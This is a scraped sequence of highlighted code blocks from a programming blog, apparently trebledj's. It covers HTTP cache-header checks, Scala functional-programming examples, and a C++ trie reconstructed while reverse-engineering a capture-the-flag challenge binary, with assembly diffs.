<pre class="command-line language-sh" data-prompt="$" data-filter-output="# " tabindex="0"><code class="language-sh"><span class="token comment"># GitHub Pages</span>
<span class="token function">curl</span> <span class="token parameter variable">-I</span> https://trebledj.github.io/css/main.css <span class="token operator">|</span> <span class="token function">grep</span> cache-control
<span class="token comment"># cache-control: max-age=600</span>
<span class="token comment"># </span>
<span class="token comment"># Cloudflare Pages with custom headers</span>
<span class="token function">curl</span> <span class="token parameter variable">-I</span> https://trebledj.me/css/main.css <span class="token operator">|</span> <span class="token function">grep</span> cache-control
<span class="token comment"># cache-control: public, max-age=14400, must-revalidate</span></code></pre>
<pre class="language-scala" tabindex="0"><code class="language-scala"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// Construct a tuple.</span>
<span class="token keyword">val</span> t<span class="token operator">:</span> <span class="token punctuation">(</span><span class="token builtin">Int</span><span class="token punctuation">,</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Tuple types.</span>
t<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Access a tuple -- returns 3.</span>
t <span class="token keyword">match</span> <span class="token punctuation">{</span>
  <span class="token keyword">case</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token keyword">=&gt;</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token comment">// Pattern match on a tuple.</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
<pre class="language-scala" tabindex="0"><code class="language-scala"><span class="token keyword">def</span> operate<span class="token punctuation">(</span>f<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token keyword">=&gt;</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token keyword">=&gt;</span> <span class="token builtin">Int</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment">// Function types.</span>
  \<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> f<span class="token punctuation">(</span>x<span class="token punctuation">)</span>   <span class="token comment">// Lambda.</span>
<span class="token punctuation">}</span>
<span class="token comment">// `operate` is a higher order function since it takes in a function as parameter.</span>

<span class="token keyword">val</span> inc<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token keyword">=&gt;</span> <span class="token builtin">Int</span> <span class="token operator">=</span> operate<span class="token punctuation">(</span>\<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
inc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
inc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>

operate<span class="token punctuation">(</span>\<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> x <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Currying -- returns 30.</span></code></pre>
<pre class="language-scala" tabindex="0"><code class="language-scala"><span class="token keyword">def</span> map<span class="token punctuation">(</span>f<span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token keyword">=&gt;</span> <span class="token builtin">Int</span><span class="token punctuation">,</span> xs<span class="token operator">:</span> Seq<span class="token punctuation">[</span><span class="token builtin">Int</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span> Seq<span class="token punctuation">[</span><span class="token builtin">Int</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>x <span class="token keyword">&lt;-</span> xs<span class="token punctuation">)</span>
      <span class="token keyword">yield</span> f<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">def</span> plus1<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
  x <span class="token operator">+</span> <span class="token number">1</span>
<span class="token punctuation">}</span>

assert<span class="token punctuation">(</span>map<span class="token punctuation">(</span>plus1<span class="token punctuation">,</span> Seq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> Seq<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<pre class="language-scala" tabindex="0"><code class="language-scala"><span class="token keyword">def</span> plus1<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> <span class="token punctuation">{</span> x <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span>
<span class="token keyword">def</span> plus2<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> <span class="token punctuation">{</span> x <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span>
<span class="token keyword">def</span> plus5<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token builtin">Int</span> <span class="token operator">=</span> <span class="token punctuation">{</span> x <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">}</span>

map<span class="token punctuation">(</span>plus1<span class="token punctuation">,</span> Seq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
map<span class="token punctuation">(</span>plus2<span class="token punctuation">,</span> Seq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
map<span class="token punctuation">(</span>plus5<span class="token punctuation">,</span> Seq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<pre class="language-scala" tabindex="0"><code class="language-scala">map<span class="token punctuation">(</span>x <span class="token keyword">=&gt;</span> x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> Seq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
map<span class="token punctuation">(</span>x <span class="token keyword">=&gt;</span> x <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> Seq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
map<span class="token punctuation">(</span>x <span class="token keyword">=&gt;</span> x <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">,</span> Seq<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
<pre class="language-scala" tabindex="0"><code class="language-scala"><span class="token keyword">def</span> f<span class="token punctuation">(</span>x<span class="token operator">:</span> <span class="token builtin">Int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>y<span class="token operator">:</span> <span class="token builtin">Char</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">{</span>
    println<span class="token punctuation">(</span><span class="token string">"int: "</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">"; char: "</span> <span class="token operator">+</span> y<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

f<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token char">'a'</span><span class="token punctuation">)</span> <span class="token comment">// int: 1; char: a</span></code></pre>
<pre class="language-scala" tabindex="0"><code class="language-scala"><span class="token keyword">val</span> g <span class="token operator">=</span> f<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">)</span>   <span class="token comment">// g: Char =&gt; Unit</span>
g<span class="token punctuation">(</span><span class="token char">'b'</span><span class="token punctuation">)</span>  <span class="token comment">// int: 10000000; char: b</span>
g<span class="token punctuation">(</span><span class="token char">'c'</span><span class="token punctuation">)</span>  <span class="token comment">// int: 10000000; char: c</span>
g<span class="token punctuation">(</span><span class="token char">'d'</span><span class="token punctuation">)</span>  <span class="token comment">// int: 10000000; char: d</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh"><span class="token function">nc</span> chal.hkcert23.pwnable.hk <span class="token number">28157</span></code></pre>
<pre data-lang-off="" class="language-sh" tabindex="0"><code class="language-sh">pip <span class="token function">install</span> pyyaml capstone intervaltree pyelftools diff_match_patch</code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token keyword">float</span> f<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span>string s<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* ... */</span> <span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span> <span class="token comment">// FYI, this is discouraged in actual software engineering: https://stackoverflow.com/q/1452721/10239789.</span>

<span class="token keyword">void</span> <span class="token function">wordhash</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">// return type: ???</span>

<span class="token keyword">struct</span> <span class="token class-name">TrieNode</span> <span class="token punctuation">{</span>
	<span class="token comment">// Members.</span>
	unordered_map<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span> TrieNode<span class="token operator">*</span><span class="token operator">&gt;</span> next_node<span class="token punctuation">;</span>
	<span class="token keyword">bool</span> bool1<span class="token punctuation">;</span>
	<span class="token keyword">bool</span> bool2<span class="token punctuation">;</span>

	<span class="token comment">// Constructor.</span>
	<span class="token comment">// Initialise variables. `next_node`'s constructor is called automatically.</span>
	<span class="token function">TrieNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> bool1<span class="token punctuation">{</span><span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">,</span> bool2<span class="token punctuation">{</span><span class="token boolean">false</span><span class="token punctuation">}</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>   <span class="token comment">// Member Initialiser List: https://cplusplus.com/articles/1vbCpfjN/</span>

	<span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">// return type: ???</span>
	<span class="token keyword">void</span> <span class="token function">search</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">// return type: ???</span>
	<span class="token keyword">void</span> <span class="token function">mix</span><span class="token punctuation">(</span><span class="token keyword">char</span> cmix<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment">// return type: ???</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">char</span> <span class="token function">wordhash</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> hash <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        hash <span class="token operator">^=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> hash<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">mix</span><span class="token punctuation">(</span><span class="token keyword">char</span> cmix<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	unordered_map<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span> TrieNode<span class="token operator">*</span><span class="token operator">&gt;</span> new_map<span class="token punctuation">;</span>

	<span class="token comment">// For each edge...</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> <span class="token keyword">this</span><span class="token operator">-&gt;</span>next_node<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> <span class="token keyword">this</span><span class="token operator">-&gt;</span>next_node<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>it<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">auto</span> pair <span class="token operator">=</span> <span class="token operator">*</span>it<span class="token punctuation">;</span>
		<span class="token keyword">char</span> ch <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>pair<span class="token punctuation">)</span><span class="token punctuation">;</span>
		TrieNode<span class="token operator">*</span> node <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>pair<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// ...update the character.</span>
		new_map<span class="token punctuation">[</span>ch <span class="token operator">^</span> cmix<span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// A new map is used so that old mappings aren't kept.</span>
	<span class="token comment">// Update the map of the current node.</span>
	<span class="token keyword">this</span><span class="token operator">-&gt;</span>next_node <span class="token operator">=</span> new_map<span class="token punctuation">;</span>

	<span class="token comment">// Recurse into child nodes with the same xor key.</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> <span class="token keyword">this</span><span class="token operator">-&gt;</span>next_node<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> <span class="token keyword">this</span><span class="token operator">-&gt;</span>next_node<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>it<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">auto</span> pair <span class="token operator">=</span> <span class="token operator">*</span>it<span class="token punctuation">;</span>
		<span class="token keyword">char</span> ch <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>pair<span class="token punctuation">)</span><span class="token punctuation">;</span>
		TrieNode<span class="token operator">*</span> node <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>pair<span class="token punctuation">)</span><span class="token punctuation">;</span>
		node<span class="token operator">-&gt;</span><span class="token function">mix</span><span class="token punctuation">(</span>cmix<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-diff-asm" tabindex="0"><code class="language-diff-asm"><span class="token deleted-sign deleted language-asm"><span class="token prefix deleted">-</span> call    _ZSt3getILm0EKcP8TrieNodeERNSt13tuple_elementIXT_ESt4pairIT0_T1_EE4typeERS7_
</span><span class="token inserted-sign inserted language-asm"><span class="token prefix inserted">+</span> call    _ZSt3getILm0EKcP8TrieNodeERKNSt13tuple_elementIXT_ESt4pairIT0_T1_EE4typeERKS7_</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> container<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> container<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>it<span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token comment">// ...</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// String in outer scope.</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	std<span class="token double-colon punctuation">::</span>string s<span class="token punctuation">;</span> <span class="token comment">// &lt;- string constructor called</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// do stuff</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token comment">// &lt;- string destructor called</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// String in inner scope.</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		std<span class="token double-colon punctuation">::</span>string s<span class="token punctuation">;</span> <span class="token comment">// &lt;- string constructor called</span>
		<span class="token comment">// do stuff</span>
	<span class="token punctuation">}</span>   <span class="token comment">// &lt;- string destructor called</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Passing lvalue string to normal parameter.</span>
<span class="token comment">// Copy constructor is called and a temp object is created.</span>
<span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	std<span class="token double-colon punctuation">::</span>string s<span class="token punctuation">;</span> <span class="token comment">// &lt;- string constructor called</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// do stuff</span>
		<span class="token comment">// ---</span>
		<span class="token comment">// &lt;- string copy constructor called (copies s to a temporary)</span>
		<span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// &lt;- string destructor (of temporary string) called</span>
		<span class="token comment">// ---</span>
		<span class="token comment">// do more stuff</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>   <span class="token comment">// &lt;- string destructor called</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token comment">// Passing rvalue string to normal parameter.</span>
<span class="token comment">// Regular constructor is called and a temp object is created.</span>
<span class="token keyword">void</span> <span class="token function">print</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// do stuff</span>
		<span class="token comment">// ---</span>
		<span class="token comment">// `const char*` literal is implicitly converted to std::string.</span>
		<span class="token comment">// &lt;- string constructor called (creates a temporary)</span>
		<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// &lt;- string destructor (of temporary string) called</span>
		<span class="token comment">// ---</span>
		<span class="token comment">// do more stuff</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> opt<span class="token punctuation">;</span>
    string str<span class="token punctuation">;</span>
    TrieNode<span class="token operator">*</span> node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">TrieNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// `const char*` literal is implicitly converted to std::string.</span>
    node<span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"\x72\x50\x54\x52\x73\x66\x51\x5a\x79\x72\x75\x4b\x7f\x4e\x4d\x55\x47\x7e\x68\x7e\x72\x51\x42\x71"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// node-&gt;insert(string("...")); also works</span>
    <span class="token comment">// -- snip --</span>
    <span class="token comment">// node-&gt;insert("...");</span>
    
    node<span class="token operator">-&gt;</span>should_mix <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Enter [1] for insert string"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Enter [2] for search string"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Option: "</span><span class="token punctuation">;</span>
        cin <span class="token operator">&gt;&gt;</span> opt<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>opt <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Input string to insert: "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
            cin <span class="token operator">&gt;&gt;</span> str<span class="token punctuation">;</span>
            node<span class="token operator">-&gt;</span><span class="token function">insert</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>opt <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Input string to search: "</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
            cin <span class="token operator">&gt;&gt;</span> str<span class="token punctuation">;</span>
            <span class="token keyword">bool</span> res <span class="token operator">=</span> node<span class="token operator">-&gt;</span><span class="token function">search</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span>
                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"String "</span> <span class="token operator">&lt;&lt;</span> str <span class="token operator">&lt;&lt;</span> <span class="token string">" exists."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
            <span class="token keyword">else</span>
                cout <span class="token operator">&lt;&lt;</span> <span class="token string">"String "</span> <span class="token operator">&lt;&lt;</span> str <span class="token operator">&lt;&lt;</span> <span class="token string">" does not exists."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Bye"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-sh" tabindex="0"><code class="language-sh">g++ <span class="token string">"<span class="token variable">$@</span>"</span> -fno-asm <span class="token parameter variable">-std</span><span class="token operator">=</span>c++17 <span class="token parameter variable">-g</span> <span class="token parameter variable">-o</span> <span class="token string">"<span class="token variable">$binary</span>"</span> <span class="token string">"<span class="token variable">$source</span>"</span></code></pre>
<pre class="language-diff-cpp" tabindex="0"><code class="language-diff-cpp"><span class="token unchanged language-cpp"><span class="token prefix unchanged"> </span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">=</span> next_node<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> it <span class="token operator">!=</span> next_node<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>it<span class="token punctuation">)</span> <span class="token punctuation">{</span>
</span><span class="token deleted-sign deleted language-cpp"><span class="token prefix deleted">-</span>     <span class="token keyword">auto</span> pair <span class="token operator">=</span> <span class="token operator">*</span>it<span class="token punctuation">;</span>
<span class="token prefix deleted">-</span>     <span class="token keyword">char</span> ch <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>pair<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token prefix deleted">-</span>     TrieNode<span class="token operator">*</span> node <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">get</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>pair<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span><span class="token inserted-sign inserted language-cpp"><span class="token prefix inserted">+</span>     <span class="token keyword">auto</span> <span class="token punctuation">[</span>ch<span class="token punctuation">,</span> node<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span>it<span class="token punctuation">;</span>
</span><span class="token unchanged language-cpp"><span class="token prefix unchanged"> </span>     new_map<span class="token punctuation">[</span>ch <span class="token operator">^</span> cmix<span class="token punctuation">]</span> <span class="token operator">=</span> node<span class="token punctuation">;</span>
<span class="token prefix unchanged"> </span> <span class="token punctuation">}</span></span></code></pre>
<pre class="language-cpp" tabindex="0"><code class="language-cpp"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">auto</span><span class="token operator">&amp;</span> pr <span class="token operator">:</span> map<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// pr.first, pr.second</span>
<span class="token punctuation">}</span></code></pre>
<pre class="language-diff-asm" tabindex="0"><code class="language-diff-asm"><span class="token unchanged language-asm"><span class="token prefix unchanged"> </span>  <span class="token comment">; Extra stack variables!</span>
</span><span class="token deleted-sign deleted language-asm"><span class="token prefix deleted">-</span>  sub     rsp<span class="token punctuation">,</span> <span class="token number">0xc8</span>
<span class="token prefix deleted">-</span>  mov     <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0xc8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rdi
</span><span class="token inserted-sign inserted language-asm"><span class="token prefix inserted">+</span>  sub     rsp<span class="token punctuation">,</span> <span class="token number">0xb8</span>
